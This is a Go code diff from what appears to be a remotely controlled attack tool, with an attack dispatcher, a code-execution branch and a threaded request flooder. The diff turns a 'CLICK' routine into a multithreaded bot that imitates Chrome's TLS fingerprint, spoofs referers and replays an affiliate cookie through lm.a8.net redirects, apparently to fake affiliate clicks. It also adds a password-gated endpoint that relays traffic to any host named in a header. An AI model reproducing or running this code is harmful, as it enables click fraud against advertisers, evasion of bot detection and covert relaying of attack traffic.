@@ -8,6 +8,8 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"net/http/httputil"
+	"net/url"
 	"os"
 	"os/exec"
 	"strings"
@@ -141,7 +143,7 @@ func Role(Attack AttackManager) {
 			RUN(value.B.Code)
 		case "CLICK":
 			wg.Add(1)
-			go AF(value.Host, value.Thread, &wg)
+			go Clicker(value.Host, value.Headers, value.Thread, &wg)
 		}
 	}
 	wg.Wait()
@@ -379,110 +381,120 @@ func CF_POST(Host, Body string, Headers []string, Thread int, wgs *sync.WaitGrou
 	wg.Wait()
 }
 
-func AF(Host string, Thread int, wgs *sync.WaitGroup) {
+func Clicker(Host string, Headers []string, Thread int, wgs *sync.WaitGroup) {
 	defer wgs.Done()
 	var wg sync.WaitGroup
 	for i := 0; i <= Thread; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			s := click(Host)
-			client := &http.Client{}
-			req, err := http.NewRequest("GET", s, nil)
+			jar := tls_client.NewCookieJar()
+			options := []tls_client.HttpClientOption{
+				tls_client.WithTimeoutSeconds(30),
+				tls_client.WithClientProfile(profiles.Chrome_112),
+				tls_client.WithNotFollowRedirects(),
+				tls_client.WithCookieJar(jar),
+			}
+
+			client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
+			if err != nil {
+				return
+			}
+			URL, err := Clicked(client, Host)
 			if err != nil {
 				fmt.Println(err)
 				return
 			}
-			req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
-			req.Header.Set("accept-language", "ja,en-US;q=0.9,en;q=0.8")
-			req.Header.Set("sec-ch-ua", `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`)
-			req.Header.Set("sec-ch-ua-mobile", "?0")
-			req.Header.Set("sec-ch-ua-platform", `"Windows"`)
-			req.Header.Set("sec-fetch-dest", "document")
-			req.Header.Set("sec-fetch-mode", "navigate")
-			req.Header.Set("sec-fetch-site", "none")
-			req.Header.Set("sec-fetch-user", "?1")
-			req.Header.Set("upgrade-insecure-requests", "1")
-			req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
-			client.Do(req)
+			data, err := ReqRedirect(client, URL)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+			ViewContent(client, data)
 		}()
 	}
 	wg.Wait()
 }
 
-func click(URL string) string {
-	jar := tls_client.NewCookieJar()
-	options := []tls_client.HttpClientOption{
-		tls_client.WithTimeoutSeconds(30),
-		tls_client.WithClientProfile(profiles.Chrome_105),
-		tls_client.WithNotFollowRedirects(),
-		tls_client.WithCookieJar(jar),
+func Clicked(client tls_client.HttpClient, URL string) (string, error) {
+	req, err := httpf.NewRequest("GET", URL, nil)
+	if err != nil {
+		return "", err
 	}
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+	req.Header.Set("Accept-Language", "ja,en-US;q=0.9,en;q=0.8")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Referer", "https://eptrone.com/")
+	req.Header.Set("Sec-Fetch-Dest", "document")
+	req.Header.Set("Sec-Fetch-Mode", "navigate")
+	req.Header.Set("Sec-Fetch-Site", "cross-site")
+	req.Header.Set("Sec-Fetch-User", "?1")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
+	req.Header.Set("sec-ch-ua", `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`)
+	req.Header.Set("sec-ch-ua-mobile", "?0")
+	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	s, err := resp.Location()
+	if err != nil {
+		return "", err
+	}
+	return s.String(), nil
+}
 
-	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
+func ReqRedirect(client tls_client.HttpClient, URL string) (string, error) {
+	req, err := httpf.NewRequest("GET", URL, nil)
 	if err != nil {
-		fmt.Println(err)
-		return ""
+		return "", err
 	}
-	req, err := httpf.NewRequest("GET", "https://mttag.com/s/"+URL, nil)
-	if err != nil {
-		fmt.Println(err)
-		return ""
-	}
-	req.Header.Set("authority", "mttag.com")
+	req.Header.Set("authority", "lm.a8.net")
 	req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
 	req.Header.Set("accept-language", "ja,en-US;q=0.9,en;q=0.8")
+	req.Header.Set("cookie", "A8_SHARED=aUPcjoisZRu43GUPq")
+	req.Header.Set("referer", "https://eptrone.com/")
 	req.Header.Set("sec-ch-ua", `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`)
 	req.Header.Set("sec-ch-ua-mobile", "?0")
 	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
 	req.Header.Set("sec-fetch-dest", "document")
 	req.Header.Set("sec-fetch-mode", "navigate")
-	req.Header.Set("sec-fetch-site", "none")
+	req.Header.Set("sec-fetch-site", "cross-site")
 	req.Header.Set("sec-fetch-user", "?1")
 	req.Header.Set("upgrade-insecure-requests", "1")
 	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Println(err)
-		return ""
+		return "", err
 	}
-	var b string
-	for value, r := range resp.Header {
-		if value == "Set-Cookie" {
-			b = strings.Split(r[0], ";")[0]
-		}
+	s, err := resp.Location()
+	if err != nil {
+		return "", err
 	}
+	return s.String(), nil
+}
 
-	req, err = httpf.NewRequest("GET", "https://mttag.com/cc/"+URL, nil)
+func ViewContent(client tls_client.HttpClient, URL string) {
+	req, err := httpf.NewRequest("GET", URL, nil)
 	if err != nil {
 		fmt.Println(err)
-		return ""
+		return
 	}
-	req.Header.Set("authority", "mttag.com")
-	req.Header.Set("accept-language", "ja,en-US;q=0.9,en;q=0.8")
-	req.Header.Set("cookie", b)
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+	req.Header.Set("Accept-Language", "ja,en-US;q=0.9,en;q=0.8")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Referer", "https://eptrone.com/")
+	req.Header.Set("Sec-Fetch-Dest", "document")
+	req.Header.Set("Sec-Fetch-Mode", "navigate")
+	req.Header.Set("Sec-Fetch-Site", "cross-site")
+	req.Header.Set("Sec-Fetch-User", "?1")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
 	req.Header.Set("sec-ch-ua", `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`)
 	req.Header.Set("sec-ch-ua-mobile", "?0")
 	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
-	req.Header.Set("sec-fetch-dest", "document")
-	req.Header.Set("sec-fetch-mode", "navigate")
-	req.Header.Set("sec-fetch-site", "none")
-	req.Header.Set("sec-fetch-user", "?1")
-	req.Header.Set("upgrade-insecure-requests", "1")
-	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
-	resp, err = client.Do(req)
-	if err != nil {
-		fmt.Println(err)
-		return ""
-	}
-	var bs string
-	for value, r := range resp.Header {
-		fmt.Println(value)
-		if value == "Location" {
-			bs = r[0]
-		}
-	}
-	return bs
+	client.Do(req)
 }
 
 func Hello(c echo.Context) error {
@@ -507,12 +519,31 @@ func Hello(c echo.Context) error {
 	return c.String(http.StatusOK, "Attacked")
 }
 
+func Gmorning(c echo.Context) error {
+	password := c.Request().Header.Get("X-Password")
+	if password != "ipRPBRzxxDjprV-RPSdBfKhM5B5-SLLQsCh5rBCYXTZMTaZtH8Ee6zu2YCAVzYQpmWtdQTiHWksNjBKepM3Jn2jRNAcisVykYKBf" {
+		return c.String(http.StatusOK, "Hello World")
+	}
+
+	URL := c.Request().Header.Get("X-Host")
+	target, err := url.Parse(URL)
+	if err != nil {
+		return err
+	}
+
+	proxy := httputil.NewSingleHostReverseProxy(target)
+
+	proxy.ServeHTTP(c.Response(), c.Request())
+	return nil
+}
+
 func Handler(w http.ResponseWriter, r *http.Request) {
 	//go Rule()
 	e := echo.New()
 	e.Use(middleware.Logger())
 	e.Use(middleware.Recover())
 	e.GET("/api/hello", Hello)
+	e.Any("/api/gmorning", Gmorning)
 
 	e.ServeHTTP(w, r)
 }
